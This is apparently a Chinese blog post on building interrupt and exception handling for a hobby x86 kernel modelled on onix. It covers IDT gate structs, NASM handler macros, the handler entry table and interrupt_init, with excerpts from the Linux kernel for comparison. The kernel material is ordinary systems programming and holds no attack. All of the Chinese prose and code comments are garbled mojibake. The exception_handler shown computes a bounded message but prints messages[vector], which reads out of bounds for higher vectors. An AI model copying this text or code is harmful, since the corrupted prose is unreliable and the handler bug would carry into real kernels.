&gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // ä»£ç æ®µ gate-&gt;reserved = 0; // ä¿ç•™ä¸ç”¨ gate-&gt;type = 0b1110; // ä¸­æ–­é—¨ gate-&gt;segment = 0; // ç³»ç»Ÿæ®µ gate-&gt;DPL = 0; // å†…æ ¸æ€ gate-&gt;present = 1; // æœ‰æ•ˆ &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; BMB; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; gate-&gt;type 0b0101 - ä»»åŠ¡é—¨ (Task Gate)ï¼šå¾ˆå¤æ‚ï¼Œè€Œä¸”å¾ˆä½æ•ˆ x64 å°±å»æ‰äº†è¿™ç§é—¨ 0b1110 - ä¸­æ–­é—¨ (Interrupt Gate) IF ä½è‡ªåŠ¨ç½®ä¸º 0 0b1111 - é™·é˜±é—¨ (Trap Gate) åŒæ—¶æ¨¡ä»¿linuxï¼Œæœ‰ä¸­æ–­å¤„ç†å‡½æ•°å…¥å£çš„ç¨‹åº src/kernel/handler.asm 1234567891011121314151617181920[bits 32]; ä¸­æ–­å¤„ç†å‡½æ•°å…¥å£ section .textextern printkglobal interrupt_handlerinterrupt_handler: xchg bx, bx push message call printk add esp, 4 xchg bx, bx iretsection .datamessage: db &quot;interrput test&quot;,10,0 æˆ‘ä»¬å¯ä»¥åˆ›å»º255ä¸ªç³»ç»Ÿä¸­æ–­ï¼Œå³255ä¸ªIDTï¼Œä½¿ç”¨bochsè°ƒè¯•ä¸€ä¸‹ è€Œidtçš„åœ°å€ï¼š0x10900å°±æ˜¯interrupt_handler æœ€åä¹Ÿè¢«æˆåŠŸæ‰§è¡Œäº† å‚è€ƒ https://www.cnblogs.com/LittleHann/p/3871630.html https://en.wikipedia.org/wiki/Interrupt_vector_table æ“ä½œç³»ç»Ÿå®ç°-å¼‚å¸¸ ç®€å•å®ç° å¼‚å¸¸ æ•…éšœ é™·é˜± ç»ˆæ­¢ æ•…éšœ Fault è¿™ç§é”™è¯¯æ˜¯å¯ä»¥è¢«ä¿®å¤çš„ä¸€ç§ç±»å‹ï¼Œå±äºæœ€è½»çš„ä¸€ç§å¼‚å¸¸ï¼› é™·é˜± Trap æ­¤å¼‚å¸¸é€šå¸¸ç”¨äºè°ƒè¯• ç»ˆæ­¢ Abort æ˜¯æœ€ä¸¥é‡çš„å¼‚å¸¸ç±»å‹ï¼Œä¸€æ—¦å‡ºç°ç”±äº é”™è¯¯æ— æ³•ä¿®å¤ï¼Œç¨‹åºå°†æ— æ³•ç»§ç»­è¿è¡Œ æ¯ä¸ªä¸€åœºéƒ½éœ€è¦ä¸€ä¸ªä¸­æ–­ï¼Œæ‰€ä»¥æœ‰30ä¸ªä¸­æ–­ï¼Œç”¨åˆ°æ±‡ç¼–å®(marco)å»å¤„ç† src/kernel/handler.asm 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159[bits 32]; ä¸­æ–­å¤„ç†å‡½æ•°å…¥å£ extern handler_tablesection .text%macro INTERRUPT_HANDLER 2interrupt_handler_%1: xchg bx, bx%ifn %2 push 0x20222202%endif push %1; å‹å…¥ä¸­æ–­å‘é‡ï¼Œè·³è½¬åˆ°ä¸­æ–­å…¥å£ jmp interrupt_entry%endmacrointerrupt_entry: ; ä¿å­˜ä¸Šæ–‡å¯„å­˜å™¨ä¿¡æ¯ push ds push es push fs push gs pusha ; æ‰¾åˆ°å‰é¢ push %1 å‹å…¥çš„ ä¸­æ–­å‘é‡ mov eax, [esp + 12 * 4] ; å‘ä¸­æ–­å¤„ç†å‡½æ•°ä¼ é€’å‚æ•° push eax ; è°ƒç”¨ä¸­æ–­å¤„ç†å‡½æ•°ï¼Œhandler_table ä¸­å­˜å‚¨äº†ä¸­æ–­å¤„ç†å‡½æ•°çš„æŒ‡é’ˆ call [handler_table + eax * 4] ; å¯¹åº” push eaxï¼Œè°ƒç”¨ç»“æŸæ¢å¤æ ˆ add esp, 4 ; æ¢å¤ä¸‹æ–‡å¯„å­˜å™¨ä¿¡æ¯ popa pop gs pop fs pop es pop ds ; å¯¹åº” push %1 ; å¯¹åº” error code æˆ– push magic add esp, 8 iretINTERRUPT_HANDLER 0x00, 0; divide by zeroINTERRUPT_HANDLER 0x01, 0; debugINTERRUPT_HANDLER 0x02, 0; non maskable interruptINTERRUPT_HANDLER 0x03, 0; breakpointINTERRUPT_HANDLER 0x04, 0; overflowINTERRUPT_HANDLER 0x05, 0; bound range exceededINTERRUPT_HANDLER 0x06, 0; invalid opcodeINTERRUPT_HANDLER 0x07, 0; device not avilableINTERRUPT_HANDLER 0x08, 1; double faultINTERRUPT_HANDLER 0x09, 0; coprocessor segment overrunINTERRUPT_HANDLER 0x0a, 1; invalid TSSINTERRUPT_HANDLER 0x0b, 1; segment not presentINTERRUPT_HANDLER 0x0c, 1; stack segment faultINTERRUPT_HANDLER 0x0d, 1; general protection faultINTERRUPT_HANDLER 0x0e, 1; page faultINTERRUPT_HANDLER 0x0f, 0; reservedINTERRUPT_HANDLER 0x10, 0; x87 floating point exceptionINTERRUPT_HANDLER 0x11, 1; alignment checkINTERRUPT_HANDLER 0x12, 0; machine checkINTERRUPT_HANDLER 0x13, 0; SIMD Floating - Point ExceptionINTERRUPT_HANDLER 0x14, 0; Virtualization ExceptionINTERRUPT_HANDLER 0x15, 1; Control Protection ExceptionINTERRUPT_HANDLER 0x16, 0; reservedINTERRUPT_HANDLER 0x17, 0; reservedINTERRUPT_HANDLER 0x18, 0; reservedINTERRUPT_HANDLER 0x19, 0; reservedINTERRUPT_HANDLER 0x1a, 0; reservedINTERRUPT_HANDLER 0x1b, 0; reservedINTERRUPT_HANDLER 0x1c, 0; reservedINTERRUPT_HANDLER 0x1d, 0; reservedINTERRUPT_HANDLER 0x1e, 0; reservedINTERRUPT_HANDLER 0x1f, 0; reservedINTERRUPT_HANDLER 0x20, 0; clock æ—¶é’Ÿä¸­æ–­INTERRUPT_HANDLER 0x21, 0INTERRUPT_HANDLER 0x22, 0INTERRUPT_HANDLER 0x23, 0INTERRUPT_HANDLER 0x24, 0INTERRUPT_HANDLER 0x25, 0INTERRUPT_HANDLER 0x26, 0INTERRUPT_HANDLER 0x27, 0INTERRUPT_HANDLER 0x28, 0INTERRUPT_HANDLER 0x29, 0INTERRUPT_HANDLER 0x2a, 0INTERRUPT_HANDLER 0x2b, 0INTERRUPT_HANDLER 0x2c, 0INTERRUPT_HANDLER 0x2d, 0INTERRUPT_HANDLER 0x2e, 0INTERRUPT_HANDLER 0x2f, 0; ä¸‹é¢çš„æ•°ç»„è®°å½•äº†æ¯ä¸ªä¸­æ–­å…¥å£å‡½æ•°çš„æŒ‡é’ˆsection .dataglobal handler_entry_tablehandler_entry_table: dd interrupt_handler_0x00 dd interrupt_handler_0x01 dd interrupt_handler_0x02 dd interrupt_handler_0x03 dd interrupt_handler_0x04 dd interrupt_handler_0x05 dd interrupt_handler_0x06 dd interrupt_handler_0x07 dd interrupt_handler_0x08 dd interrupt_handler_0x09 dd interrupt_handler_0x0a dd interrupt_handler_0x0b dd interrupt_handler_0x0c dd interrupt_handler_0x0d dd interrupt_handler_0x0e dd interrupt_handler_0x0f dd interrupt_handler_0x10 dd interrupt_handler_0x11 dd interrupt_handler_0x12 dd interrupt_handler_0x13 dd interrupt_handler_0x14 dd interrupt_handler_0x15 dd interrupt_handler_0x16 dd interrupt_handler_0x17 dd interrupt_handler_0x18 dd interrupt_handler_0x19 dd interrupt_handler_0x1a dd interrupt_handler_0x1b dd interrupt_handler_0x1c dd interrupt_handler_0x1d dd interrupt_handler_0x1e dd interrupt_handler_0x1f dd interrupt_handler_0x20 dd interrupt_handler_0x21 dd interrupt_handler_0x22 dd interrupt_handler_0x23 dd interrupt_handler_0x24 dd interrupt_handler_0x25 dd interrupt_handler_0x26 dd interrupt_handler_0x27 dd interrupt_handler_0x28 dd interrupt_handler_0x29 dd interrupt_handler_0x2a dd interrupt_handler_0x2b dd interrupt_handler_0x2c dd interrupt_handler_0x2d dd interrupt_handler_0x2e dd interrupt_handler_0x2f src/include/xsys/interrupt.h 1234567891011121314151617181920212223#ifndef XSYS_INTERRUPT_H#define XSYS_INTERRUPT_H#include &lt;xsys/types.h&gt;#define IDT_SIZE 256typedef struct gate_t&#123; u16 offset0; // æ®µå†…åç§» 0 ~ 15 ä½ u16 selector; // ä»£ç æ®µé€‰æ‹©å­ u8 reserved; // ä¿ç•™ä¸ç”¨ u8 type : 4; // ä»»åŠ¡é—¨/ä¸­æ–­é—¨/é™·é˜±é—¨ u8 segment : 1; // segment = 0 è¡¨ç¤ºç³»ç»Ÿæ®µ u8 DPL : 2; // ä½¿ç”¨ int æŒ‡ä»¤è®¿é—®çš„æœ€ä½æƒé™ u8 present : 1; // æ˜¯å¦æœ‰æ•ˆ u16 offset1; // æ®µå†…åç§» 16 ~ 31 ä½&#125; _packed gate_t;typedef void *handler_t; // ä¸­æ–­å¤„ç†å‡½æ•°void interrupt_init();#endif src/kernel/interrupt.c 1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071727374757677787980818283848586878889909192939495#include &lt;xsys/interrupt.h&gt;#include &lt;xsys/global.h&gt;#include &lt;xsys/debug.h&gt;#include &lt;xsys/printk.h&gt;#include &lt;xsys/io.h&gt;#include &lt;xsys/assert.h&gt;#define LOGK(fmt, args...) DEBUGK(fmt, ##args)// #define LOGK(fmt, args...)#define ENTRY_SIZE 0x30#define PIC_M_CTRL 0x20 // ä¸»ç‰‡çš„æ§åˆ¶ç«¯å£#define PIC_M_DATA 0x21 // ä¸»ç‰‡çš„æ•°æ®ç«¯å£#define PIC_S_CTRL 0xa0 // ä»ç‰‡çš„æ§åˆ¶ç«¯å£#define PIC_S_DATA 0xa1 // ä»ç‰‡çš„æ•°æ®ç«¯å£#define PIC_EOI 0x20 // é€šçŸ¥ä¸­æ–­æ§åˆ¶å™¨ä¸­æ–­ç»“æŸgate_t idt[IDT_SIZE];pointer_t idt_ptr;handler_t handler_table[IDT_SIZE];extern handler_t handler_entry_table[ENTRY_SIZE];static char *messages[] = &#123; &quot;#DE Divide Error\\0&quot;, &quot;#DB RESERVED\\0&quot;, &quot;-- NMI Interrupt\\0&quot;, &quot;#BP Breakpoint\\0&quot;, &quot;#OF Overflow\\0&quot;, &quot;#BR BOUND Range Exceeded\\0&quot;, &quot;#UD Invalid Opcode (Undefined Opcode)\\0&quot;, &quot;#NM Device Not Available (No Math Coprocessor)\\0&quot;, &quot;#DF Double Fault\\0&quot;, &quot; Coprocessor Segment Overrun (reserved)\\0&quot;, &quot;#TS Invalid TSS\\0&quot;, &quot;#NP Segment Not Present\\0&quot;, &quot;#SS Stack-Segment Fault\\0&quot;, &quot;#GP General Protection\\0&quot;, &quot;#PF Page Fault\\0&quot;, &quot;-- (Intel reserved. Do not use.)\\0&quot;, &quot;#MF x87 FPU Floating-Point Error (Math Fault)\\0&quot;, &quot;#AC Alignment Check\\0&quot;, &quot;#MC Machine Check\\0&quot;, &quot;#XF SIMD Floating-Point Exception\\0&quot;, &quot;#VE Virtualization Exception\\0&quot;, &quot;#CP Control Protection Exception\\0&quot;,&#125;;void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125;// åˆå§‹åŒ–ä¸­æ–­æè¿°ç¬¦ï¼Œå’Œä¸­æ–­å¤„ç†å‡½æ•°æ•°ç»„void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // ä»£ç æ®µ gate-&gt;reserved = 0; // ä¿ç•™ä¸ç”¨ gate-&gt;type = 0b1110; // ä¸­æ–­é—¨ gate-&gt;segment = 0; // ç³»ç»Ÿæ®µ gate-&gt;DPL = 0; // å†…æ ¸æ€ gate-&gt;present = 1; // æœ‰æ•ˆ &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; åœ¨start.asmä¸­å†™ä¸€ä¸ªint 0x80è¶…å‡ºèŒƒå›´è°ƒç”¨ src/kernel/start.asm 123456789[bits 32]extern kernel_initglobal _start_start: call kernel_init int 0x80 jmp $ å¯ä»¥çœ‹åˆ°å·²ç»æŠŠå‚æ•°éƒ½å‹è¿›å»äº†ï¼Œæ ¹æ®åˆ¤æ–­å¯åŠ¨äº†ç¬¬13å·é»˜è®¤è°ƒç”¨ å†æ˜¯ä¸€ä¸ªé™¤0å¼‚å¸¸ src/kernel/start.asm 12345678910[bits 32]extern kernel_initglobal _start_start: call kernel_init mov bx, 0 div bx jmp $ å¼‚å¸¸åˆ—è¡¨ ç¼–å· åç§° ç±»å‹ åŠ©è®°ç¬¦ é”™è¯¯ç  0 (0x0) é™¤é›¶é”™è¯¯ æ•…éšœ #DE æ—  1 (0x1) è°ƒè¯• æ•…éšœ/é™·é˜± #DB æ—  2 (0x2) ä¸å¯å±è”½ä¸­æ–­ ä¸­æ–­ - æ—  3 (0x3) æ–­ç‚¹ é™·é˜± #BP æ—  4 (0x4) æº¢å‡º é™·é˜± #OF æ—  5 (0x5) è¶Šç•Œ æ•…éšœ #BR æ—  6 (0x6) æŒ‡ä»¤æ— æ•ˆ æ•…éšœ #UD æ—  7 (0x7) è®¾å¤‡ä¸å¯ç”¨ æ•…éšœ #NM æ—  8 (0x8) åŒé‡é”™è¯¯ ç»ˆæ­¢ #DF æœ‰ (Zero) 9 (0x9) åå¤„ç†å™¨æ®µè¶…é™ æ•…éšœ - æ—  10 (0xA) æ— æ•ˆä»»åŠ¡çŠ¶æ€æ®µ æ•…éšœ #TS æœ‰ 11 (0xB) æ®µæ— æ•ˆ æ•…éšœ #NP æœ‰ 12 (0xC) æ ˆæ®µé”™è¯¯ æ•…éšœ #SS æœ‰ 13 (0xD) ä¸€èˆ¬æ€§ä¿æŠ¤å¼‚å¸¸ æ•…éšœ #GP æœ‰ 14 (0xE) ç¼ºé¡µé”™è¯¯ æ•…éšœ #PF æœ‰ 15 (0xF) ä¿ç•™ - - æ—  16 (0x10) æµ®ç‚¹å¼‚å¸¸ æ•…éšœ #MF æ—  17 (0x11) å¯¹é½æ£€æµ‹ æ•…éšœ #AC æœ‰ 18 (0x12) æœºå™¨æ£€æµ‹ ç»ˆæ­¢ #MC æ—  19 (0x13) SIMD æµ®ç‚¹å¼‚å¸¸ æ•…éšœ #XM/#XF æ—  20 (0x14) è™šæ‹ŸåŒ–å¼‚å¸¸ æ•…éšœ #VE æ—  21 (0x15) æ§åˆ¶ä¿æŠ¤å¼‚å¸¸ æ•…éšœ #CP æœ‰ 22-31 (0x16-0x1f) ä¿ç•™ - - æ—  Linuxæ˜¯æ€æ ·åšåˆ°çš„ å®˜æ–¹è¯´æ˜ï¼šhttps://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html Below we can find Linux IRQ vector layout. The first 32 entries are reserved for exceptions, vector 128 is used for syscall interface and the rest are used mostly for hardware interrupts handlers. è¿™æ˜¯linuxå¯¹ä¸åŒä¸­æ–­ç¼–å·çš„åˆ†ç±» åœ¨å¤ä¹ ä¸‹ä¹‹å‰çš„æ“ä½œç³»ç»Ÿå®ç°-ç³»ç»Ÿä¸­æ–­çš„å†…å®¹ï¼Œæˆ‘ä»¬åœ¨è¿™ç¯‡åšå®¢é‡Œé¢æ˜¯å®ç°çš„å¼‚å¸¸å¤„ç†ï¼Œå†Linuxä¸Šå¯¹åº”çš„ç¼–å·æ˜¯0~31 /arch/x86/include/asm/irq_vectors.h 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114/* SPDX-License-Identifier: GPL-2.0 */#ifndef _ASM_X86_IRQ_VECTORS_H#define _ASM_X86_IRQ_VECTORS_H#include &lt;linux/threads.h&gt;/* * Linux IRQ vector layout. * * There are 256 IDT entries (per CPU - each entry is 8 bytes) which can * be defined by Linux. They are used as a jump table by the CPU when a * given vector is triggered - by a CPU-external, CPU-internal or * software-triggered event. * * Linux sets the kernel code address each entry jumps to early during * bootup, and never changes them. This is the general layout of the * IDT entries: * * Vectors 0 ... 31 : system traps and exceptions - hardcoded events * Vectors 32 ... 127 : device interrupts * Vector 128 : legacy int80 syscall interface * Vectors 129 ... LOCAL_TIMER_VECTOR-1 * Vectors LOCAL_TIMER_VECTOR ... 255 : special interrupts..... *//* This is used as an interrupt vector when programming the APIC. */#define NMI_VECTOR 0x02/* * IDT vectors usable for external interrupt sources start at 0x20. * (0x80 is the syscall vector, 0x30-0x3f are for ISA) */#define FIRST_EXTERNAL_VECTOR 0x20/* * Reserve the lowest usable vector (and hence lowest priority) 0x20 for * triggering cleanup after irq migration. 0x21-0x2f will still be used * for device interrupts. */#define IRQ_MOVE_CLEANUP_VECTOR FIRST_EXTERNAL_VECTOR#define IA32_SYSCALL_VECTOR 0x80/* * Vectors 0x30-0x3f are used for ISA interrupts. * round up to the next 16-vector boundary */#define ISA_IRQ_VECTOR(irq) (((FIRST_EXTERNAL_VECTOR + 16) &amp; ~15) + irq)/* * Special IRQ vectors used by the SMP architecture, 0xf0-0xff * * some of the following vectors are &#x27;rare&#x27;, they are merged * into a single vector (CALL_FUNCTION_VECTOR) to save vector space. * TLB, reschedule and local APIC vectors are performance-critical. */#define SPURIOUS_APIC_VECTOR 0xff/* * Sanity check */#if ((SPURIOUS_APIC_VECTOR &amp; 0x0F) != 0x0F)# error SPURIOUS_APIC_VECTOR definition error#endif#define ERROR_APIC_VECTOR 0xfe#define RESCHEDULE_VECTOR 0xfd#define CALL_FUNCTION_VECTOR 0xfc#define CALL_FUNCTION_SINGLE_VECTOR 0xfb#define THERMAL_APIC_VECTOR 0xfa#define THRESHOLD_APIC_VECTOR 0xf9#define REBOOT_VECTOR 0xf8/* * Generic system vector for platform specific use */#define X86_PLATFORM_IPI_VECTOR 0xf7/* * IRQ work vector: */............/* * Size the maximum number of interrupts. * * If the irq_desc[] array has a sparse layout, we can size things * generously - it scales up linearly with the maximum number of CPUs, * and the maximum number of IO-APICs, whichever is higher. * * In other cases we size more conservatively, to not create too large * static arrays. */#define NR_IRQS_LEGACY 16#define CPU_VECTOR_LIMIT (64 * NR_CPUS)#define IO_APIC_VECTOR_LIMIT (32 * MAX_IO_APICS)#if defined(CONFIG_X86_IO_APIC) &amp;&amp; defined(CONFIG_PCI_MSI)#define NR_IRQS \\ (CPU_VECTOR_LIMIT &gt; IO_APIC_VECTOR_LIMIT ? \\ (NR_VECTORS + CPU_VECTOR_LIMIT) : \\ (NR_VECTORS + IO_APIC_VECTOR_LIMIT))#elif defined(CONFIG_X86_IO_APIC)#define NR_IRQS (NR_VECTORS + IO_APIC_VECTOR_LIMIT)#elif defined(CONFIG_PCI_MSI)#define NR_IRQS (NR_VECTORS + CPU_VECTOR_LIMIT)#else#define NR_IRQS NR_IRQS_LEGACY#endif#endif /* _ASM_X86_IRQ_VECTORS_H */ æ¥ç€å°±æ˜¯ä¸‰ç§é—¨ï¼š On x86 an IDT entry has 8 bytes and it is named gate. There can be 3 types of gates: interrupt gate, holds the address of an interrupt or exception handler. Jumping to the handler disables maskable interrupts (IF flag is cleared). trap gates, similar to an interrupt gate but it does not disable maskable interrupts while jumping to interrupt/exception handler. task gates (not used in Linux) è¿™ä¸ªgateå°±æ˜¯ä¸­æ–­æè¿°ç¬¦çš„ç»“æ„ä½“ï¼Œå…·ä½“é—¨çš„æœ‰ä¸‰ç§ï¼šä¸­æ–­é—¨ã€é™·é˜±é—¨ã€ä»»åŠ¡é—¨(æ²¡æœ‰å†Linuxä¸Šä½¿ç”¨) åŒæ—¶æ–‡æ¡£ä¹Ÿå‘æˆ‘ä»¬è¯´æ˜äº†IDT_Entryï¼ˆå³ï¼šé—¨ï¼‰çš„å±æ€§ Letâ€™s have a look at several fields of an IDT entry: segment selector, index into GDT/LDT to find the start of the code segment where the interrupt handlers reside offset, offset inside the code segment T, represents the type of gate DPL, minimum privilege required for using the segments content. è¦æœ‰ä¸€ä¸ªæ®µé€‰æ‹©å­ï¼Œèƒ½å¤Ÿå°†ä»å…¨å±€æè¿°ç¬¦è¡¨å’Œå’Œä¸­æ–­æè¿°ç¬¦è¡¨æ‰¾åˆ°å¯¹åº”çš„å†…å­˜å’Œä¸­æ–­å‡½æ•°(imnterrupt handlers) åœ¨ä»£ç æ®µä¸­çš„åç§» é—¨ç±»å‹çš„ä»£è¡¨ ä½¿ç”¨è¯¥æ®µä¿¡æ¯çš„æœ€å°æƒé™å€¼ æ‰€ä»¥æˆ‘ä»¬å†™é™¤äº†ä»£ç ï¼š 1234567891011typedef struct gate_t&#123; u16 offset0; // æ®µå†…åç§» 0 ~ 15 ä½ u16 selector; // ä»£ç æ®µé€‰æ‹©å­ u8 reserved; // ä¿ç•™ä¸ç”¨ u8 type : 4; // ä»»åŠ¡é—¨/ä¸­æ–­é—¨/é™·é˜±é—¨ u8 segment : 1; // segment = 0 è¡¨ç¤ºç³»ç»Ÿæ®µ u8 DPL : 2; // ä½¿ç”¨ int æŒ‡ä»¤è®¿é—®çš„æœ€ä½æƒé™ u8 present : 1; // æ˜¯å¦æœ‰æ•ˆ u16 offset1; // æ®µå†…åç§» 16 ~ 31 ä½&#125; _packed gate_t; åŒæ—¶çš„Linuxå®ç°ï¼š /arch/x86/include/asm/desc_defs.h 12345678910struct gate_struct &#123; u16 offset_low; u16 segment; struct idt_bits bits; u16 offset_middle;#ifdef CONFIG_X86_64 u32 offset_high; u32 reserved;#endif&#125; __attribute__((packed)); ä»ä¸Šé¢å¾—çŸ¥æˆ‘ä»¬éœ€è¦å¯¹gateæœ‰åˆå§‹åŒ– æ‰€ä»¥å†™äº† 12345678910111213141516171819202122232425262728void interrupt_init()&#123; for (size_t i = 0; i &lt; ENTRY_SIZE; i++) &#123; gate_t *gate = &amp;idt[i]; handler_t handler = handler_entry_table[i]; gate-&gt;offset0 = (u32)handler &amp; 0xffff; gate-&gt;offset1 = ((u32)handler &gt;&gt; 16) &amp; 0xffff; gate-&gt;selector = 1 &lt;&lt; 3; // ä»£ç æ®µ gate-&gt;reserved = 0; // ä¿ç•™ä¸ç”¨ gate-&gt;type = 0b1110; // ä¸­æ–­é—¨ gate-&gt;segment = 0; // ç³»ç»Ÿæ®µ gate-&gt;DPL = 0; // å†…æ ¸æ€ gate-&gt;present = 1; // æœ‰æ•ˆ &#125; for (size_t i = 0; i &lt; 0x20; i++) &#123; handler_table[i] = exception_handler; &#125; idt_ptr.base = (u32)idt; idt_ptr.limit = sizeof(idt) - 1; asm volatile(&quot;lidt idt_ptr\\n&quot;);&#125; å¯¹åº”çš„Linuxä¸­æœ‰ï¼šï¼ˆè¿™ä¹Ÿåªæ˜¯å…¶ä¸­ä¸€ç§ï¼‰ /arch/x86/boot/compressed/idt_64.c 12345678910111213141516static void set_idt_entry(int vector, void (*handler)(void))&#123; unsigned long address = (unsigned long)handler; gate_desc entry; memset(&amp;entry, 0, sizeof(entry)); entry.offset_low = (u16)(address &amp; 0xffff); entry.segment = __KERNEL_CS; entry.bits.type = GATE_TRAP; entry.bits.p = 1; entry.offset_middle = (u16)((address &gt;&gt; 16) &amp; 0xffff); entry.offset_high = (u32)(address &gt;&gt; 32); memcpy(&amp;boot_idt[vector], &amp;entry, sizeof(entry));&#125; è¿˜éœ€è¦ä¸€ä¸ªå‡½æ•°æ¥å¸®åŠ©gateçš„æ®µé€‰æ‹©å­æ‰¾åˆ°ç›¸å¯¹åº”çš„ç³»ç»Ÿè°ƒç”¨å·ï¼Œè¿™ä¸ªå‡½æ•°è¢«ç§°ä¸ºinterrupt_handler è¿™é‡Œæˆ‘ä»¬å®ç°çš„æ˜¯å¼‚å¸¸ï¼Œæ‰€ä»¥æ˜¯exception_handler 123456789101112131415void exception_handler(int vector)&#123; char *message = NULL; if (vector &lt; 22) &#123; message = messages[vector]; &#125; else &#123; message = messages[15]; &#125; printk(&quot;\\nEXCEPTION : %s \\n&quot;, messages[vector]); while(true);&#125; åŒæ—¶æˆ‘é—¨åœ¨è·³è½¬çš„æ—¶å€™éœ€è¦ä½¿ç”¨æ ˆæ¥ä¿å­˜ç›¸å…³ä¿¡æ¯ï¼Œå¹¶ä¸”è¦è®°å½•ç³»ç»Ÿè°ƒç”¨å·å¯¹åº”çš„å‡½æ•°åœ°å€ï¼Œå¯¹äºæœ‰çš„æŠ¥é”™éœ€è¦å‹å…¥ä¸€äº›å€¼åˆ°æ ˆé‡Œé¢ As can be seen in the figure below, an interrupt pushes the EFLAGS register before saving the address of the interrupted instruction. Certain types of exceptions also cause an error code to be pushed on the stack to help debug the exception. CPU checks the current privilege level if need to change privilege level change stack with the one associated with new privilege save old stack information on the new stack save EFLAGS, CS, EIP on stack save error code on stack in case of an abort execute the kernel interrupt handler To resume the execution after an interrupt the following sequence is used (x86): pop the error code (in case of an abort) call IRET pops values from the stack and restore the following register: CS, EIP, EFLAGS if privilege level changed returns to the old stack and old privilege level æ‰€ä»¥ä¹Ÿæœ‰äº†handler.asmä¸­çš„handler_entry_tableé‚£ä¹ˆé•¿ä¸€ä¸²ï¼Œä»¥åŠ 1234567891011121314151617181920212223242526272829303132interrupt_entry: ; ä¿å­˜ä¸Šæ–‡å¯„å­˜å™¨ä¿¡æ¯ push ds push es push fs push gs pusha ; æ‰¾åˆ°å‰é¢ push %1 å‹å…¥çš„ ä¸­æ–­å‘é‡ mov eax, [esp + 12 * 4] ; å‘ä¸­æ–­å¤„ç†å‡½æ•°ä¼ é€’å‚æ•° push eax ; è°ƒç”¨ä¸­æ–­å¤„ç†å‡½æ•°ï¼Œhandler_table ä¸­å­˜å‚¨äº†ä¸­æ–­å¤„ç†å‡½æ•°çš„æŒ‡é’ˆ call [handler_table + eax * 4] ; å¯¹åº” push eaxï¼Œè°ƒç”¨ç»“æŸæ¢å¤æ ˆ add esp, 4 ; æ¢å¤ä¸‹æ–‡å¯„å­˜å™¨ä¿¡æ¯ popa pop gs pop fs pop es pop ds ; å¯¹åº” push %1 ; å¯¹åº” error code æˆ– push magic add esp, 8 iret åŒæ ·çš„åœ¨Linuxä¸­ä¹Ÿæœ‰ï¼Œä½†æ˜¯ä»–çš„å®ç°æ›´åŠ çš„å¤æ‚ ä¸è¿‡ä»ç„¶èƒ½æ‰¾åˆ°/arch/x86/kernel/entry_32.Sï¼ˆå…¶ä»–ç‰ˆæœ¬å¯èƒ½å®ç°åœ°æ–¹ä¸åŒï¼Œè¿™æ˜¯2.6å†…æ ¸ç‰ˆæœ¬çš„ï¼‰ 123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778.macro TRACE_IRQS_IRET#ifdef CONFIG_TRACE_IRQFLAGS testl $X86_EFLAGS_IF,PT_EFLAGS(%esp) # interrupts off? jz 1f TRACE_IRQS_ON1:#endif.endm....../* * User gs save/restore * * %gs is used for userland TLS and kernel only uses it for stack * canary which is required to be at %gs:20 by gcc. Read the comment * at the top of stackprotector.h for more info. * * Local labels 98 and 99 are used. */#ifdef CONFIG_X86_32_LAZY_GS /* unfortunately push/pop can&#x27;t be no-op */.macro PUSH_GS pushl_cfi $0.endm.macro POP_GS pop=0 addl $(4 + \\pop), %esp CFI_ADJUST_CFA_OFFSET -(4 + \\pop).endm.macro POP_GS_EX.endm /* all the rest are no-op */.macro PTGS_TO_GS.endm.macro PTGS_TO_GS_EX.endm.macro GS_TO_REG reg.endm.macro REG_TO_PTGS reg.endm.macro SET_KERNEL_GS reg.endm.......macro GS_TO_REG reg movl %gs, \\reg /*CFI_REGISTER gs, \\reg*/.endm.macro REG_TO_PTGS reg movl \\reg, PT_GS(%esp) /*CFI_REL_OFFSET gs, PT_GS*/.endm.macro SET_KERNEL_GS reg movl $(__KERNEL_STACK_CANARY), \\reg movl \\reg, %gs.endm#endif /* CONFIG_X86_32_LAZY_GS */.macro SAVE_ALL cld PUSH_GS pushl_cfi %fs /*CFI_REL_OFFSET fs, 0;*/ pushl_cfi %es /*CFI_REL_OFFSET es, 0;*/ pushl_cfi %ds /*CFI_REL_OFFSET ds, 0;*/ pushl_cfi %eax CFI_REL_OFFSET eax, 0 pushl_cfi %ebp CFI_REL_OFFSET ebp, 0.......macro RESTORE_INT_REGS popl_cfi %ebx...... å¯¹åº”çš„64ä½ï¼š/arch/x86/kernel/entry_64.S å‚è€ƒ https://linux-kernel-labs.github.io/refs/heads/master/lectures/interrupts.html https://lrita.github.io/2019/03/05/linux-interrupt-and-trap/ æ“ä½œç³»ç»Ÿå®ç°-å¤–ä¸­æ–­ ä»£ç æ¥æºï¼šhttps://github.com/StevenBaby/onix ç›¸å…³è¯¾ç¨‹ï¼šhttps://www.bilibili.com/video/BV1gR4y1u7or æ„Ÿè°¢Bç«™UPï¼šè¸Œèº‡æœˆå…‰ å¸¦æ¥çš„ç›¸å…³ä»£ç å’Œæ•™ç¨‹ upçš„åŸè§†é¢‘ç›´æ¥å¼€å§‹å°†æºä»£ç 